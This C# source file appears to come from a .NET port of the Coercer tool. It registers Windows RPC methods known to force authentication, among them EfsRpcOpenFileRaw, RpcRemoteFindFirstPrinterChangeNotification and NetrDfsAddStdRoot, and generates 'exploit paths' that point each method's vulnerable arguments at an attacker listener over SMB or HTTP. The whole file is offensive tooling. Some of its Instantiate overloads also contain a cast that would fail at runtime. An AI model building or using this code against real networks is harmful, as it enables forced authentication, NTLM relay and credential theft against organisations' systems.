using System.Text.RegularExpressions;
using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods
{
    public class AvailableMethods
    {
        public Type[] Methods { get; }

        public AvailableMethods()
        {
            Methods = new Type[]
            {
                typeof(MS_DFSNM.NetrDfsAddStdRoot),
                typeof(MS_DFSNM.NetrDfsRemoveStdRoot),
                typeof(MS_EFSR.EfsRpcAddUsersToFile),
                typeof(MS_EFSR.EfsRpcAddUsersToFileEx),
                typeof(MS_EFSR.EfsRpcDecryptFileSrv),
                typeof(MS_EFSR.EfsRpcDuplicateEncryptionInfoFile),
                typeof(MS_EFSR.EfsRpcEncryptFileSrv),
                typeof(MS_EFSR.EfsRpcFileKeyInfo),
                typeof(MS_EFSR.EfsRpcOpenFileRaw),
                typeof(MS_EFSR.EfsRpcQueryRecoveryAgents),
                typeof(MS_EFSR.EfsRpcQueryUsersOnFile),
                typeof(MS_EFSR.EfsRpcRemoveUsersFromFile),
                typeof(MS_EVEN.ElfrOpenBELW),
                typeof(MS_FSRVP.IsPathShadowCopied),
                typeof(MS_FSRVP.IsPathSupported),
                typeof(MS_RPRN.RpcRemoteFindFirstPrinterChangeNotification),
                typeof(MS_RPRN.RpcRemoteFindFirstPrinterChangeNotificationEx)
            };
        }

        public Method[] Instantiate(AuthType authType, string listener)
        {
            return (Method[])Methods.Select(method => Activator.CreateInstance(method, new object[] { authType, listener }) ?? throw new Exception("Failed to instantiate method object."));
        }
        public Method Instantiate(int methodIndex, AuthType authType, string listener)
        {
            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener }) ?? throw new Exception("Failed to instantiate method object."));
        }
        public Method[] Instantiate(AuthType authType, string listener, int port)
        {
            return (Method[])Methods.Select(method => Activator.CreateInstance(method, new object[] { authType, listener, port }) ?? throw new Exception("Failed to instantiate method object."));
        }
        public Method Instantiate(int methodIndex, AuthType authType, string listener, int port)
        {
            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener, port }) ?? throw new Exception("Failed to instantiate method object."));
        }
        public Method[] Instantiate(AuthType authType, string listener, int httpPort, int smbPort)
        {
            return (Method[])Methods.Select(method => Activator.CreateInstance(method, new object[] { authType, listener, httpPort, smbPort }) ?? throw new Exception("Failed to instantiate method object.")).ToArray();
        }
        public Method Instantiate(int methodIndex, AuthType authType, string listener, int httpPort, int smbPort)
        {
            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener, httpPort, smbPort }) ?? throw new Exception("Failed to instantiate method object."));
        }

        public static Method Instantiate<T>(AuthType authType, string listener) where T : Method
        {
            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener }) ?? throw new Exception("Failed to instantiate method object."));
        }

        public static Method Instantiate<T>(AuthType authType, string listener, int port) where T : Method
        {
            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener, port }) ?? throw new Exception("Failed to instantiate method object."));
        }

        public static Method Instantiate<T>(AuthType authType, string listener, int httpPort, int smbPort) where T : Method
        {
            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener, httpPort, smbPort }) ?? throw new Exception("Failed to instantiate method object."));
        }
    }

    public abstract class Method
    {
        public abstract string Description { get; }
        public abstract string Author { get; }
        public abstract ExploitPathTemplate[] ExploitPathTemplates { get; }
        public string[] ExploitPaths { get; }
        public abstract NcanNpAccess[] NcanNpAccesses { get; }
        public abstract NcacnIpTcpAccess[] NcacnIpTcpAccesses { get; }
        public abstract Protocol Protocol { get; }
        public abstract Function Function { get; }

        public Method(AuthType authType, string listener)
        {
            ExploitPaths = ExploitPathTemplates.Where(template => authType == AuthType.NONE || authType == template.AuthType).Select(template => template.Generate(listener)).ToArray();
        }

        public Method(AuthType authType, string listener, int port)
        {
            if (authType == AuthType.NONE)
            {
                throw new Exception("If auth type is none, must provide ports for both types.");
            }
            ExploitPaths = ExploitPathTemplates.Where(template => authType == template.AuthType).Select(template => template.Generate(listener, port)).ToArray();
        }

        public Method(AuthType authType, string listener, int httpPort, int smbPort)
        {
            ExploitPaths = ExploitPathTemplates.Where(template => authType == AuthType.NONE || authType == template.AuthType).Select(template => template.Generate(listener, template.AuthType == AuthType.HTTP ? httpPort : template.AuthType == AuthType.SMB ? smbPort : throw new Exception("Auth Type cannot be none."))).ToArray();
        }

        public void Print(string path)
        {
            Console.Write(Protocol.ShortName);
            Console.Write("──>");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(Function.Name);
            Console.ResetColor();
            string[] vulnerableArguments = Function.VulnerableArguments;
            for (int i = 0; i < vulnerableArguments.Length; i++)
            {
                string vulnerableArgument = vulnerableArguments[i];
                if (i == 0)
                {
                    Console.Write("(");
                }

                Console.ForegroundColor = ConsoleColor.Blue;
                Console.Write(vulnerableArgument);
                Console.ResetColor();
                Console.Write("=");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write($"'{path}'");
                Console.ResetColor();

                if (i == (vulnerableArguments.Length - 1))
                {
                    Console.Write(")");
                }
                else
                {
                    Console.Write(", ");
                }
            }
        }

        // public abstract void Trigger();
    }

    public class Access
    {
        public string Uuid { get; }
        public string Version { get; }

        public Access(string uuid, string version)
        {
            Uuid = uuid;
            Version = version;
        }
    }

    public class NcanNpAccess : Access
    {
        public string NamedPipe { get; }

        public NcanNpAccess(string namedPipe, string uuid, string version) : base(uuid, version)
        {
            NamedPipe = namedPipe;
        }
    }

    public class NcacnIpTcpAccess : Access
    {
        public NcacnIpTcpAccess(string uuid, string version) : base(uuid, version) { }
    }

    public class Protocol
    {
        public string Name { get; }
        public string ShortName { get; }

        public Protocol(string name, string shortName)
        {
            Name = name;
            ShortName = shortName;
        }
    }

    public class Function
    {
        public string Name { get; }
        public int Opnum { get; }
        public string[] VulnerableArguments { get; }

        public Function(string name, int opnum, string[] vulnerableArguments)
        {
            Name = name;
            Opnum = opnum;
            VulnerableArguments = vulnerableArguments;
        }
    }

    public class ExploitPathTemplate
    {
        private static readonly string regexPattern = @"\{\{(\d+)\}\}";
        private static readonly string randomStringAvailableChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        private static readonly Random random = new();
        public AuthType AuthType { get; }
        public string Template { get; }

        public ExploitPathTemplate(AuthType authType, string template)
        {
            AuthType = authType;
            Template = template;
        }

        public string Generate(string listener, int port)
        {
            string exploitPath = Template;
            exploitPath = exploitPath.Replace("{{listener}}", listener);
            exploitPath = exploitPath.Replace("{{port}}", "@" + port.ToString());

            exploitPath = Regex.Replace(exploitPath, regexPattern, match =>
            {
                int randomStringLength = int.Parse(match.Groups[1].Value);
                char[] randomStringChars = new char[randomStringLength];
                for (int i = 0; i < randomStringLength; i++)
                {
                    randomStringChars[i] = randomStringAvailableChars[random.Next(randomStringAvailableChars.Length)];
                }
                return new string(randomStringChars);
            });

            return exploitPath;
        }

        public string Generate(string listener)
        {
            if (AuthType == AuthType.NONE)
            {
                throw new Exception("Auth Type cannot be none.");
            }
            return Generate(listener, AuthType == AuthType.SMB ? 445 : 80);
        }
    }
}